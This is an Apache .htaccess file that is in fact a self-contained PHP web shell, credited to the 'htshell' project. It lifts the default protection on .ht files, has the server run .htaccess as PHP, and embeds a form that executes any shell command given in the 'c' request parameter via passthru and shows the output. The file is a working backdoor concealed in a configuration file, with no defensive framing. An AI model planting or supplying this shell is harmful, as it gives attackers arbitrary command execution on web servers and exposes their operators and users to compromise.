# <!--  Self contained .htaccess web shell - Part of the htshell project
# Written by Wireghoul - http://www.justanotherhacker.com

# Override default deny rule to make .htaccess file accessible over web
<Files ~ "^\.ht">
# Uncomment the line below for Apache2.4 and newer
# Require all granted
    Order allow,deny
    Allow from all
</Files>

# Make .htaccess file be interpreted as php file. This occur after apache has interpreted 
# the apache directoves from the .htaccess file
AddType application/x-httpd-php .htaccess

###### SHELL ###### <?php echo "--><form method='get'><input type='text' name='c' value='".$_GET['c']."'><input type='submit' name='go' value='Go!'></form>\n<pre>";passthru($_GET['c']." 2>&1");echo "</pre>"; ?>
